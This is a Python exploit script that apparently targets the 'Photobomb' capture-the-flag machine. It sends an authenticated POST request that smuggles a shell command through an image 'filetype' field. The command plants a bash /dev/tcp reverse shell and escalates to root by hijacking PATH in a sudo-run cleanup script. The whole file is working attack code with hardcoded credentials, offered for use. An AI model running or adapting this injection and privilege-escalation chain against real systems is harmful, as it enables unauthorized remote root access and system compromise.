# This is a script i used to get a reverse shell from target as root user
# Usage: Python3 photobombo-pwn.py localIP localPORT
# Setup: Run a netcat listener on localport 
# WARNING: Before run the script make sure your host file containe the target hostname

import sys
import requests	

class Rce:

	def __init__(self,ip,port):
		self.local_ip = ip
		self.local_port = port
		self.url = "http://photobomb.htb/printer"
		self.header = {"Authorization": "Basic cEgwdDA6YjBNYiE="}

	def MakePayload(self):
		ReverseShell = f"bash -i >& /dev/tcp/{self.local_ip}/{self.local_port} 0>&1"
		Command = f"/home/wizard/find | chmod +x /home/wizard/find | sudo PATH=/home/wizard:$PATH /opt/cleanup.sh"
		payload = f"echo -n \'{ReverseShell}\' > {Command}"
		self.RunCommand(payload)

	def RunCommand(self,payload):
		data = {"photo":"finn-whelen-DTfhsDIWNSg-unsplash.jpg","filetype":"jpg;"+payload,"dimensions":"3000x2000"}
		r = requests.post(url=self.url,headers=self.header,data=data)
		print(r.text)

Rootshell = Rce(sys.argv[1],sys.argv[2])
Rootshell.MakePayload()